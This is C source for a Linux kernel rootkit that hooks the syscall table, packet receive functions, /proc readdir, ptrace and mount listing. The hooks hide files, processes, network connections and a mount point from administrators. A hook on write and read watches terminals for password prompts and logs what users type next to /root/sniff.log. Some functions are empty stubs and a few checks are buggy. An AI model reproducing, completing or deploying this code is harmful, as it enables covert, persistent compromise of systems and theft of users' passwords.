#include <arch.h>
#include <cdefs.h>
#include <rklib.h>
#include <defs.h>
#include <kdefs.h>
#include <libc.h>
#include <unistd.h>
#include <opsig.h>
#include <rkcore.h>

asm (".globl kstart\n");
asm (".globl kend\n");
asm (".globl rkargs\n");
asm (".globl rksyms\n");
asm (".globl kenter\n");

struct kargs   rkargs = {-1};
struct ksyms   rksyms = {(void *)-1};
struct rkhook  rkhooks[12] = {{(void *)-1}};

/* sct */
static unsigned long   *vsctmap        = (void *)-1; /* vsctmap */
static unsigned long   *osctmap        = (void *)-1; /* osctmap */

/* struct offsets */
static unsigned int     pidoff         = -1;         /* offset of current->pid */
static unsigned int     skbprotoff     = -1;         /* skbuff->protocol offset */
static unsigned int     skbiphoff      = -1;         /* skbuff->nh offset */
static unsigned int     skbheadoff     = -1;
static unsigned int     skbnetoff      = -1;
static unsigned long    inode_offset   = -1;
static unsigned long    fops_offset    = -1;
static unsigned long    rd_offset      = -1;
static unsigned long    pfs_pid_addr   = -1;

/* rkdbg */
static unsigned long    sysenter_ex    = -1;         /* address of sysexit */
static unsigned long    syscall_ex     = -1;         /* address of sysexit */
unsigned long           brk_syscall    = -1;
unsigned long           sct_disp       = -1;
unsigned long           sct_patch      = -1;
unsigned int            dr_enabled     = -1;

static spinlock_t pkt_lock = {-1};
static spinlock_t pid_lock = {-1};
static spinlock_t ip_lock  = {-1};

static struct m_cache pidcache    = {-1};
static struct m_cache inodecache  = {-1};
static struct m_cache ipv4cache   = {-1};
static struct m_cache ipv6cache   = {-1};
static struct m_cache sniffcache  = {-1};
static struct m_cache ptracecache = {-1};

LIST_HEAD(pidmap);
LIST_HEAD(inodemap);
LIST_HEAD(ipmap4);
LIST_HEAD(ipmap6);
LIST_HEAD(sniffmap);
LIST_HEAD(ptracemap);

static int (*filldir)(void *, char *, int, loff_t, u64, u32) = (void *)-1;
extern void rkdbg(struct pt_regs *regs, long err);

#ifdef  __IA32__
static unsigned char dbgjmp[8]  = {'\xb9','\xff','\xff','\xff','\xff','\xff','\xe1', '\xff'};
static unsigned char pktjmp[8]  = {'\xb9','\xff','\xff','\xff','\xff','\xff','\xe1', '\xff'};
static unsigned char tpkjmp[8]  = {'\xb9','\xff','\xff','\xff','\xff','\xff','\xe1', '\xff'};
static unsigned char rawjmp[8]  = {'\xb9','\xff','\xff','\xff','\xff','\xff','\xe1', '\xff'};
#endif
#ifdef __AMD64__
static unsigned char dbgjmp[12] = {'\x48','\xb8','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xff','\xe0'};
static unsigned char pktjmp[12] = {'\x48','\xb8','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xff','\xe0'};
static unsigned char tpkjmp[12] = {'\x48','\xb8','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xff','\xe0'};
static unsigned char rawjmp[12] = {'\x48','\xb8','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xff','\xe0'};
#endif
#ifdef __MIPS32__
static unsigned char dbjmp[16]  = {'\x3c','\x0a','\xcc','\xcc','\x35','\x4a','\xcc','\xcc','\x01','\x40','\x00','\x08','\x00','\x20','\x08','\x25'};
static unsigned char pktjmp[16] = {'\x3c','\x0a','\xcc','\xcc','\x35','\x4a','\xcc','\xcc','\x01','\x40','\x00','\x08','\x00','\x20','\x08','\x25'};
static unsigned char tpkjmp[16] = {'\x3c','\x0a','\xcc','\xcc','\x35','\x4a','\xcc','\xcc','\x01','\x40','\x00','\x08','\x00','\x20','\x08','\x25'};
static unsigned char rawjmp[16] = {'\x3c','\x0a','\xcc','\xcc','\x35','\x4a','\xcc','\xcc','\x01','\x40','\x00','\x08','\x00','\x20','\x08','\x25'};
#endif

/*
 * rkmalloc: f1x3d s1z3 m1n1 sl4b all0k4t0r
 */

static void
rkmem_cache_create(struct m_cache *cachep, unsigned long size)
{
	cachep->page = vmalloc(4096);
	cachep->objsize = size;
	cachep->freemap = -1;
}

static void *
rkmalloc(struct m_cache *cachep)
{
	unsigned long bmap, objsize;
	unsigned long lckflags;
	int n;

	SPIN_LOCK(&cachep->lock, lckflags);
	bmap = cachep->freemap;
	objsize = cachep->objsize;
	n = ffs(bmap);
	cachep->freemap = (bmap &= ~(1<<(n-1)));
	SPIN_UNLOCK(&cachep->lock, lckflags);
	return (void *)(cachep->page+(n*objsize));
}

void
rkfree(struct m_cache *cachep, void *ptr)
{
	unsigned long lckflags;
	int n;

	SPIN_LOCK(&cachep->lock, lckflags);
	n = ((ptr-cachep->page)/cachep->objsize);
	cachep->freemap |= (1<<(n-1));
	SPIN_UNLOCK(&cachep->lock, lckflags);
}

/*
 * rkhooks
 */

static void
sethook(struct rkhook *rk)
{
	setrw();
	rkmemcpy(rk->ptr, rk->jmp, FHOOKSZ);
	setro();
}

static void
unhook(struct rkhook *rk)
{
	setrw();
	rkmemcpy(rk->ptr, rk->org, FHOOKSZ);
	setro();
}

static void
setaddr(struct rkhook *rk)
{
	*(unsigned long *)(rk->ptr) = (unsigned long)rk->jmp;
}

static void
usetaddr(struct rkhook *rk)
{
	*(unsigned long *)(rk->ptr) = *(unsigned long *)rk->org;
}

static void
scthook(struct rkhook *rk)
{
	setrw();
	SCTJMP(rk->ptr, rk->jmp);
	setro();
}

static void
sctunhook(struct rkhook *rk)
{
	setrw();
	SCTJMP(rk->ptr, rk->org);
	setro();
}
static int
smpid()
{
#ifdef __AMD64__
	__asm__ __volatile__("mov %gs:0xb0b0, %eax\n");
	__asm__ __volatile__("movslq %eax, %rax\n");
#endif
}

#ifdef __AMD64__
static unsigned long current()
{
	__asm__ __volatile__("mov %gs:0xd0d0, %rax\n");
}
#endif

#ifdef __IA32__
static unsigned long *current()
{
	return ((struct thread_info *)current_thread_info())->task;
}
#endif

#ifdef __MIPS32__
static unsigned long current()
{
	__asm__ __volatile__("move $t0, $gp\n"
                         "lw   $v0, 0($t0)");
}
#endif

#define covert() phidden(curpid())

static __inline__
int
curpid(void)
{
	return *(int *)(((unsigned char *)current())+pidoff);
}

/* sniff */
static __inline__
void
setsniff(int pid)
{

}

static __inline__
void
unsetsniff(int pid)
{

}

static __inline__
int
sniffing(int pid)
{

}

/* procs */
static __inline__
void
setpid(int pid)
{
	struct rkproc *kp;
	unsigned long lckflags;

	kp = rkmalloc(&pidcache);
	kp->pid = pid;

	SPIN_LOCK(&pid_lock, lckflags);
	list_add(&kp->list, &pidmap);
	SPIN_UNLOCK(&pid_lock, lckflags);
}

static __inline__
void
unsetpid(int pid)
{
	struct rkproc *kp;
	unsigned long lckflags;

	SPIN_LOCK(&pid_lock, lckflags);
	LIST_FOR_EACH_ENTRY(kp, &pidmap, list) {
		if (kp->pid == pid) {
			list_del(&kp->list);
			rkfree(&pidcache, kp);
			break;
		}
	}
	SPIN_UNLOCK(&pid_lock, lckflags);
}

static int
phidden(int pid)
{
	struct rkproc *kp;

	LIST_FOR_EACH_ENTRY(kp, &pidmap, list) {
		if (kp->pid == pid) {
			return 1;
		}
	}
	return 0;
}

/* files */
static __inline__
int
setinode(uint64_t ino)
{
	struct rkinode *kp;

	kp = rkmalloc(&inodecache);
	kp->inode = ino;
	list_add(&kp->list, &inodemap);
}

static __inline__
int
unsetinode(uint64_t ino)
{
	struct rkinode *kp;

	LIST_FOR_EACH_ENTRY(kp, &inodemap, list) {
		if (kp->inode == ino) {
			list_del(&kp->list);
			rkfree(&inodecache, kp);
			break;
		}
	}
}

static __inline__
int
ihidden(uint64_t ino)
{
	struct rkinode *kp;

	LIST_FOR_EACH_ENTRY(kp, &inodemap, list) {
		if (kp->inode == ino) {
			return 1;
		}
	}
	return 0;
}

/*
 * VFS hooks
 */

static int
rkpath(char *path, uint64_t ino)
{
	if (!rkmemcmp(path, ".rk", 3))
		return 1;

	if (ihidden(ino))
		return 1;
	else
		return 0;
}

static long
rkopen(char *path, int oflag, int mode)
{
	struct kstat ks;

	if (covert())
		goto ok;

	if (vfs_stat(path, &ks))
		goto ok;

	if (rkpath(path, ks.ino))
		return -ENOENT;
ok:
	return SYSCALL(open, path, oflag, mode);
}

#define def_vfs(name)                                           \
static long                                                     \
rk##name(char *path, void *buf)                                 \
{                                                               \
    struct kstat ks;                                            \
    if (vfs_stat(path, &ks))                                    \
        return 0;                                               \
    if (rkpath(path, ks.ino))                                   \
        return -ENOENT;                                         \
    return SYSCALL(name, path, buf);                            \
}

def_vfs(stat);
def_vfs(lstat);
def_vfs(stat64);
def_vfs(lstat64);
def_vfs(truncate);
def_vfs(truncate64);
def_vfs(access);

#define def_getdents(name, dirent)                              \
static long                                                     \
rk##name(int fd, struct dirent *de, int count)                  \
{                                                               \
    char *p;                                                    \
    int reclen;                                                 \
    reclen = SYSCALL(name, fd, de, count);                      \
    if (reclen <= 0)                                            \
        return (reclen);                                        \
    p = (char *) de;                                            \
    while (reclen > 0) {                                        \
        struct dirent *dir = (struct dirent *)p;                \
        int rlen = dir->d_reclen;                               \
        int slen = rkstrlen(dir->d_name);                       \
        reclen  -= rlen;                                        \
                                                                \
        if (rkpath(dir->d_name, dir->d_ino))                    \
            rkmemcpy(dir, p + dir->d_reclen, reclen);           \
        else                                                    \
            p += rlen;                                          \
    }                                                           \
    return (long)(p - (long)de);                                \
}

def_getdents(getdents,   dirent32);
def_getdents(getdents64, dirent64);

static void
sniffy(char *buf)
{
	int fd, len;
	long fs;

	len = rkstrlen(buf);

	fs = get_fs();
	set_fs(KERNEL_DS);
	fd = SYSCALL(open, "/root/sniff.log", O_WRONLY | O_CREAT | O_APPEND);
	set_fs(fs);
	SYSCALL(write, fd, buf, len);
	SYSCALL(close, fd);
}

static int
istty(int fd)
{
	unsigned long fs;
	unsigned long i = 4;
	int ret;

	fs = get_fs();
	set_fs(KERNEL_DS);
	ret = SYSCALL(ioctl, fd, TIOCGPGRP, &i);
	set_fs(fs);
	return (ret<0?0:1);
}

static long
rkwrite(int fd, void *buf, unsigned long nbytes)
{
	int pid;

	if (covert())
		goto done;

	if (istty(fd)) {
		if (rknstrstr(buf, "assword:", nbytes)) {
			char str[32];
			pid = curpid();
			rkmemset(str, '\0', sizeof(str));
			rkstrcpy(str, "pid: ");
			rkitoa(&str[6], pid, 10);
			rkstrcat(str, "\n");
			sniffy(str);
			setsniff(pid);
		}
	}
done:
	return SYSCALL(write, fd, buf, nbytes);
}

static long
rkread(int fd, void *buf, unsigned long nbytes)
{
	int ret;

	ret = SYSCALL(read, fd, buf, nbytes);
	if (covert())
		goto done;
	if (sniffing(curpid())) {
		sniffy(buf);
		unsetsniff(curpid());
	}
done:
	return (ret);
}

/*
 * Process hiding
 */

void rkclone();

#ifdef __IA32__
asm("rkclone: \n");
#endif

#ifdef __AMD64__
asm("rkclone:                      \n"
    " pop   %r9                    \n"
    " mov   sct_disp(%rip), %r9    \n"
    " sub   %r9, %rax              \n"
    " shl   $3, %rax               \n"
    " mov   osctmap(%rip), %r9     \n"
    " add   %rax,  %r9             \n"
    " mov   (%r9), %r9             \n"
    " call  *%r9                   \n"
    " push  %rax                   \n"
    " mov   %rax, %rdi             \n"
    " call  do_fork                \n"
    " pop   %rax                   \n"
    " mov   syscall_ex(%rip), %r9  \n"
    " push  %r9                    \n"
    " ret                          \n"
   );
#endif

static void
do_fork(int pid)
{
	if (phidden(curpid()))
		setpid(pid);
}

static int
rkfilldir(void *buf, char *name, int nlen, loff_t off, uint64_t ino, uint32_t d)
{
	int pid = rkstrtoul(name, 10);
	if (phidden(pid))
		return 0;
	return filldir(buf,name,nlen,off,ino,d);
}

static int
rkpfspid(void *f, void *d, filldir_t fdir)
{
	filldir = fdir;
	return proc_root_readdir(f, d, rkfilldir);
}

/*
 * Userland hook hiding
 */

static long
rkptrace(int request, int pid, void *addr, void *data)
{
	struct tracemap *tp;
	long word;
	int x;

	word = SYSCALL(ptrace, request, pid, addr, data);
	if (request != PTRACE_PEEKTEXT &&
		request != PTRACE_PEEKDATA &&
			request != PTRACE_PEEKUSER) {
		goto falsealarm;
	}

	LIST_FOR_EACH_ENTRY(tp, &ptracemap, list) {
		if (tp->pid != pid)
			continue;
		for (x = 0; x < MAXHOOKS; x++) {
			struct rktrace   *hp = (struct rktrace *)&tp->hooks[x];
			unsigned long *caddr = hp->addr;
			if (caddr == addr || (caddr+4) == addr) {
				if (caddr == addr)
					return (*(unsigned long *)hp->bytes);
				else
					return (*(unsigned long *)(hp->bytes+4));
			}
		}
	}
falsealarm:
	return (word);
}

static void
rkseqshow(void *seqfile, void *sk)
{
	unsigned long *p = (unsigned long *)sk;
	int i;

	if (sk == (void *)1)
		goto end;

	for (i = 0; i < (344/4); i++) {
		if (*p++ == 0x6969)
			return;
	}
end:
	tcp4seqshow(seqfile, sk);
}

/*
 * shm hiding
 */
static int
rkvfsmnt(struct seq_file *m, void *mnt)
{
	int ret = show_vfsmnt(m, mnt);
	char *p = rknstrstr(m->buf, "/mnt/tmp", m->count);
	if (p) {
		return 10;
	}
	return (ret);
}

static int
rkstatfs(char *path, void *buf)
{


}

static int
rkstatfs64(char *path, void *buf)
{


}

/*
 * packet hiding
 */

#if WORDSIZE == 32
#define SKB_IPH(skb) *(struct iphdr **)(skb+skbiphoff)
#else
#define SKB_IPH(skb) skbiph64(skb)
#endif

static int
ipsearch(struct iphdr *iph, unsigned short proto)
{
	unsigned long lckflags;
	int ret = 0;

	if (proto != ETH_IPV4 || proto != ETH_IPV6)
		return 0;

	SPIN_LOCK(&ip_lock, lckflags);
	if (proto == ETH_IPV4) {
		struct rkipaddr4 *kp;
		LIST_FOR_EACH_ENTRY(kp, &ipmap4, list) {
			unsigned int ipaddr = kp->ipaddr;
			if (ipaddr = iph->saddr || ipaddr == iph->daddr) {
				ret = 1;
			}
		}
	}
	else if (proto == ETH_IPV6) {
		struct iphdr6    *ip6 = (struct iphdr6 *)iph;
		struct rkipaddr6 *kp6;
		LIST_FOR_EACH_ENTRY(kp6, &ipmap6, list) {
			if (!rkmemcmp(kp6->ipaddr, ip6->saddr, 16) ||
			    !rkmemcmp(kp6->ipaddr, ip6->daddr, 16)) {
				ret = 1;
			}
		}
	}
	SPIN_UNLOCK(&ip_lock, lckflags);
	return (ret);
}

static void
ipadd(struct sockaddr *sk)
{
	struct sockaddr_in4 *sin4;
	struct sockaddr_in6 *sin6;
	unsigned long lckflags;

	SPIN_LOCK(&ip_lock, lckflags);
	if (sk->sa_family == AF_INET) {
		struct rkipaddr4 *kp;

		kp =  rkmalloc(&ipv4cache);
		sin4 = (struct sockaddr_in4 *)sk;
		kp->ipaddr = sin4->sin_addr;
		list_add(&kp->list, &ipmap4);
	}
	else if (sk->sa_family == AF_INET6) {
		struct rkipaddr6 *kp;

		kp = rkmalloc(&ipv6cache);
		sin6 = (struct sockaddr_in6 *)sk;
		rkmemcpy(kp->ipaddr, sin6->sin6_addr, 16);
		list_add(&kp->list, &ipmap6);
	}
	SPIN_UNLOCK(&ip_lock, lckflags);
}

static void
ipdel(struct sockaddr *sk)
{


}

static struct iphdr *skbiph64(void *skb)
{
	unsigned long head;
	unsigned int netoff;

	netoff = *(unsigned int  *)(skb+skbnetoff);
	head   = *(unsigned long *)(skb+skbheadoff);
	return ((struct iphdr *)(head+netoff));
}

static int
rkpacket(void *skb, void *dev, void *pt, void *odev)
{
	struct iphdr *iph = SKB_IPH(skb);
	unsigned short protocol = *(unsigned short *)(skb+skbprotoff);
	unsigned long lckflags;

	if (ipsearch(iph, protocol)) {
		consume_skb(skb);
		return 0;
	}

	SPIN_LOCK  (&pkt_lock, lckflags);
	RKHOOK(RK_PKT, d);
	packet_rcv(skb, dev, pt, odev);
	RKHOOK(RK_PKT, e);
	SPIN_UNLOCK(&pkt_lock, lckflags);
}

static int
rktpacket(void *skb, void *dev, void *pt, void *odev)
{
	struct iphdr  *iph = SKB_IPH(skb);
	unsigned short protocol = *(unsigned short *)(skb+skbprotoff);
	unsigned long  lckflags;

	if (ipsearch(iph, protocol)) {
		consume_skb(skb);
		return 0;
	}

	SPIN_LOCK  (&pkt_lock, lckflags);
	RKHOOK(RK_TPK, d);
	tpacket_rcv(skb, dev, pt, odev);
	RKHOOK(RK_TPK, e);
	SPIN_UNLOCK(&pkt_lock, lckflags);
}

static int
rkraw(void *sk, void *skb)
{
	struct iphdr  *iph = SKB_IPH(skb);
	unsigned short protocol = *(unsigned short *)(skb+skbprotoff);
	unsigned long  lckflags;

	if (ipsearch(iph, protocol)) {
		consume_skb(skb);
		return 0;
	}

	SPIN_LOCK  (&pkt_lock, lckflags);
	RKHOOK(RK_RAW, d);
	raw_rcv(sk, skb);
	RKHOOK(RK_RAW, e);
	SPIN_UNLOCK(&pkt_lock, lckflags);
}

#ifndef __IA32__
static int
rkconnect(int fd, struct sockaddr *sk, int addrlen)
{
	if (covert())
		ipadd(sk);
	return SYSCALL(connect, fd, sk, addrlen);
}

static int
rkaccept3(int fd, struct sockaddr *sk, int *addrlen)
{
	if (covert())
		ipadd(sk);
	return SYSCALL(accept, fd, sk, addrlen);
}

static int
rkaccept4(int fd, struct sockaddr *sk, int *addrlen, int flags)
{
	if (covert())
		ipadd(sk);
	return SYSCALL(accept4, fd, sk, addrlen, flags);
}
#endif
/*
 * RK OPERATIONZ
 */

static int
rkopsfs(struct rkops *rkops)
{
	unsigned long cmd = rkops->cmd;
	unsigned long arg = rkops->arg;

	switch (cmd) {
		case RKHPID:
			setpid(arg);
			break;
		case RKUHPID:
			unsetpid(arg);
			break;
		case RKHFILE:
			if (setinode(arg))
				return -1;
			break;
		case RKUHFILE:
			unsetinode(arg);
			break;
	}
	return 0;
}

static __inline__ int
rkopstrace(struct rkops *rkops)
{
	struct rkhook_args hkargs;
	struct tracemap *tp;
	struct hook *hk1;
	unsigned long op = rkops->cmd;
	unsigned long arg = rkops->arg;
	unsigned int nsegs = -1;
	int i, ret = 0;

	switch (op) {
		case RKUHOOK:
			rkmemcpy(&hkargs, (void *)arg, sizeof(hkargs));
			nsegs = hkargs.nsegs;
			if (nsegs > MAXHOOKS)
				return -2;
			tp = rkmalloc(&ptracecache);
			rkmemcpy(&tp->hooks, hkargs.segs, nsegs*sizeof(struct rktrace));
			tp->pid = hkargs.pid;
			list_add(&tp->list, &ptracemap);
			break;
		case RKRMUHOOK:
			LIST_FOR_EACH_ENTRY(tp, &ptracemap, list) {
				if (tp->pid != arg)
					continue;
				list_del(&tp->list);
				rkfree(&ptracecache, tp);
			}
			break;
	}
	return (ret);
}

static __inline__ int
rkopsnet(struct rkops *rkops)
{

}

static int
rkop(struct rkops *rkops)
{
	unsigned int cmd = rkops->cmd;
	unsigned long arg = rkops->arg;
	int ret = 0;

	/* proc and fs ops */
	switch (cmd) {
		case RKHPID:
		case RKUHPID:
		case RKHFILE:
		case RKUHFILE:
			return rkopsfs(rkops);
		case RKUHOOK:
		case RKRMUHOOK:
		case RKSTATHOOK:
			return rkopstrace(rkops);
		case RKADDIP4:
			return rkopsnet(rkops);
	}
	return (ret);
}

/*
 * DYNAMIC OFFSETS
 */

/* task_struct->pid */
static int
getpidoff(int tgid)
{
	unsigned char volatile *task = (unsigned char volatile *)current();
	int i;

	for (i = 0; i < 1024; i++) {
		if (*(unsigned int *)(task+i) == tgid &&
		    *(unsigned int *)(task+i+4) == tgid) {
			break;
		}
	}
	return ((unsigned long)(task+i)-(unsigned long)task);
}

/* sk_buff->protocol, sk_buff->nh */
static int
getskboff(void)
{
	struct opref opref;

	opref.nb_max = 0;
	opref.end  = 0;
	opref.addr = (unsigned char *)rksyms.ip_mc_output;
	skbprotoff = rkopsig(&opref, SK_BUFF_PROT);
	printk("sk_buff.protocol: 0x%x\n", skbprotoff);
	if (skbprotoff == -1)
		goto out;

	opref.addr = (unsigned char *)rksyms.ipopt;
	skbnetoff  = rkopsig(&opref, SK_BUFF_NOFF);
	printk("sk_buff.nh:       0x%x\n", skbnetoff);
	if (skbnetoff == -1 || skbnetoff == 0)
		goto out;

#if WORDSIZE > 32
	skbheadoff = rkopsig(&opref, SK_BUFF_HOFF);
	printk("sk_buff.head:     0x%x\n", skbheadoff);
#endif
	return 1;
out:
	printk("getskboff() error\n");
	return 0;
}

/* dentry->inode, inode->fops, fops->readdir */
static int
getvfsoff(void)
{
	unsigned long *inode, *fops, *p;
	struct opref opref;
	struct path path;
	int i = 0;

	opref.nb_max = 0;
	opref.end  = 0;
	opref.addr = (unsigned char *)(fnotify_change?fnotify_change:notify_change);
	inode_offset = rkopsig(&opref, DENTRY_INODE);
		if (inode_offset == -1)
		goto bad;
	printk("inode_offset:     0x%x\n", inode_offset);

	if (kern_path("/proc", 0, &path))
		goto bad;

	inode = *(unsigned long *)(path.dentry+inode_offset);
	p = inode;
	while (i < 100) {
		if (*p == rksyms.proc_root_operations) {
			fops_offset = ((p-inode)*sizeof(unsigned long));
			fops = (unsigned long *)(*p);
			printk("fops_offset:      0x%x\n", fops_offset);
			break;
		}
		i++; p++;
	}
	if (fops_offset == -1)
		goto bad;

	p = fops; i = 0;
	while (i < 25) {
		if (*p == (unsigned long)proc_root_readdir) {
			rd_offset = ((p-fops)*sizeof(unsigned long));
			pfs_pid_addr = (unsigned long)p;
			printk("readdir_offset:   0x%x\n", rd_offset);
			break;
		}
		i++; p++;
	}
	if (rd_offset == -1)
		goto bad;
	return 1;
bad:
	printk("getvfsoff() failed\n");
	return 0;
}

/* system_call() offsets */
static int
getsctoff()
{
	unsigned long syscallentry;
	unsigned long addr = 0, sct = -1;
	unsigned char *p;
	int i;

#if defined  (__AMD64__) || defined (__IA32__)
	syscallentry = rksyms.system_call;
	p = (char *)rkmemmem((unsigned long *)syscallentry, 250, __SCT_SYM, 3);
	if (!p)
		return 0;
	brk_syscall=sct_patch=syscallentry+((unsigned long)p-syscallentry);
	syscall_ex=syscallentry+((unsigned long)p-syscallentry)+7;
	sct_patch+=3;
	printk("brk_syscall: %x\n", brk_syscall);
#endif

#if defined (__MIPS32__)
	syscallentry = rksyms.handle_sys;
	p = (char *)rkmemmem((char *)syscallentry, 400, "\x01\x40\xf8\x09", 4);
	if (!p)
		return 0;
	syscall_ex=(unsigned long)(p+4);

	p = (char *)rkmemmem((char *)syscallentry, 400, "\x2c\x48", 2);
	if (!p)
		return 0;
	p = (unsigned char *)rksyms.handle_sys;
	for (i = 0; i < 10; i++) {
		while (*p != '\x3c') p += 4;
		addr = *(unsigned short *)(p+2);
		addr <<= 16;
		addr -= (unsigned short)~(*(unsigned short *)(p+6))+1;
		if (addr == sys_call_table) {
			sct_patch = (unsigned long)p;
			break;
		}
		p += 4;
	}
#endif
	return 1;
}

static void
rkmakehooks()
{
	struct rkhook *rk;

	/* RK_DBG */
	rk = &rkhooks[RK_DBG];
	rk->jmp = dbgjmp;
	rk->ptr = do_debug;
	rk->e   = sethook;
	rk->d   = unhook;
	RKJMP(dbgjmp, (unsigned long)&rkdbg);
	rkmemcpy(rk->org, (char *)do_debug, FHOOKSZ);

	/* RK_SCT */
	rk = &rkhooks[RK_SCT];
	rk->jmp = (void *)sct_patch;
	rk->ptr = (void *)brk_syscall;
	rk->e   = scthook;
	rk->d   = sctunhook;
	*(unsigned int *)(&rk->jmp) = (unsigned int)&vsctmap;
	*(unsigned int *)(&rk->org) = (unsigned int)sys_call_table;

	/* RK_PKT */
	rk = &rkhooks[RK_PKT];
	rk->jmp = pktjmp;
	rk->ptr = packet_rcv;
	rk->e   = sethook;
	rk->d   = unhook;
	rkmemcpy(rk->org, (unsigned char *)packet_rcv, FHOOKSZ);
	*(unsigned long *)(pktjmp+2) = (unsigned long)rkpacket;

	/* RK_TPK */
	rk = &rkhooks[RK_TPK];
	rk->jmp = tpkjmp;
	rk->ptr = tpacket_rcv;
	rk->e   = sethook;
	rk->d   = unhook;
	rkmemcpy(rk->org, (unsigned char *)tpacket_rcv, FHOOKSZ);
	*(unsigned long *)(tpkjmp+2) = (unsigned long)rktpacket;

	/* RK_RAW */
	rk = &rkhooks[RK_RAW];
	rk->jmp = rawjmp;
	rk->ptr = raw_rcv;
	rk->e   = sethook;
	rk->d   = unhook;
	rkmemcpy(rk->org, (unsigned char *)raw_rcv, FHOOKSZ);
	*(unsigned long *)(rawjmp+2) = (unsigned long)rkraw;

	/* RK_PID */
	rk = &rkhooks[RK_PID];
	rk->jmp = rkpfspid;
	rk->ptr = (void *)pfs_pid_addr;
	rk->e   = setaddr;
	rk->d   = usetaddr;
	*(unsigned long *)rk->org = (unsigned long)proc_root_readdir;

	/* RK_TCP */
	rk = &rkhooks[RK_TCP];
	rk->jmp = rkseqshow;
	rk->ptr = &tcp4seqinfo->show;
	rk->e   = setaddr;
	rk->d   = usetaddr;
	*(unsigned long *)rk->org = (unsigned long)tcp4seqshow;

	/* RK_MNT */
	rk = &rkhooks[RK_MNT];
	rk->jmp = rkvfsmnt;
 	rk->ptr = &mounts_op->show;
	rk->e   = setaddr;
	rk->d   = usetaddr;
	*(unsigned long *)rk->org = (unsigned long)show_vfsmnt;
}

static void
rkmakesct()
{
	vsctmap[__NR_open]       = (unsigned long)rkopen;
	vsctmap[__NR_read]       = (unsigned long)rkread;
	vsctmap[__NR_write]      = (unsigned long)rkwrite;
	vsctmap[__NR_getdents]   = (unsigned long)rkgetdents;
	vsctmap[__NR_getdents64] = (unsigned long)rkgetdents64;
	vsctmap[__NR_access]     = (unsigned long)rkaccess;
	vsctmap[__NR_fork]       = (unsigned long)rkclone;
	vsctmap[__NR_clone]      = (unsigned long)rkclone;
	vsctmap[__NR_ptrace]     = (unsigned long)rkptrace;
	vsctmap[__NR_rkctl]      = (unsigned long)rkop;
}

int
kenter(void)
{
	struct rkhook *rk;
	unsigned long mode;
	int x;

	rkregopsig(KERN_OPSIG);

	if (!getsctoff())
		return -1;

	/* sct proxy */
	vsctmap = (unsigned long *) vmalloc(__NR_SYSCALLS * sizeof(void *));
	osctmap = (unsigned long *) vmalloc(__NR_SYSCALLS * sizeof(void *));
	rkmemcpy(vsctmap, (void *)sys_call_table, __NR_SYSCALLS * sizeof(void *));
	rkmemcpy(osctmap, (void *)sys_call_table, __NR_SYSCALLS * sizeof(void *));
	rkmakesct();

	/* get current->pid offset */
	pidoff = getpidoff(SYSCALL(getpid));
	printk("pidoff: %d\n", pidoff);

	/* vfs */
	if (!getvfsoff())
		return -1;

	/* packet/raw/net/spin */
	pkt_lock.rlock = 0;
	pid_lock.rlock = 0;
	ip_lock.rlock  = 0;
	if (!getskboff())
		return -1;

	/* rkdbg */
	rkconfdbg();
	sct_disp = (unsigned long)vsctmap-sys_call_table;
	sct_disp /= sizeof(void *);
	printk("sct_disp: %x vsctmap: %x sct: %x\n", sct_disp, vsctmap, sys_call_table);

	dr_enabled = 0;
	mode = rkargs.spmode;
	rkmakehooks();

	printk("mode: %d\n", mode);
	for (x = 0; x < NR_HOOKS-2; x++) {
		rk = &rkhooks[x];
		printk("hook #%d addr: %p\n", x, rk->ptr);
		if (mode & RKHOOKDR) {
			printk("debug: %d\n", x);
			setbrk(rk->ptr, dr_enabled++);
		}
		else {
			printk("raw hook: %d\n", x);
			rk->e(rk);
		}
		mode >>= 1;
	}
	return 0;
}
